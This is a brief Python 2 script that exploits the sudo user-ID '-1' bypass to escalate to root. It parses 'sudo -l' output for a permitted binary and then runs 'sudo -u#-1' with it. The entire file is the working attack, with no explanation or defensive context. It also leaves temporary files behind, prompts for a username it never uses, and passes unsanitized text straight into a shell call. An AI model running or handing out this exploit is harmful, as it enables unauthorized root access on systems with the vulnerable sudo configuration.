#!/usr/bin/python2

import os

# Get current username
username = raw_input("Enter current username :")

# Check which binary the user can run with sudo
os.system("sudo -l > priv")

os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary = binary_file.read()

# Execute sudo exploit
print("Lets hope it works")

os.system("sudo -u#-1 " + binary)
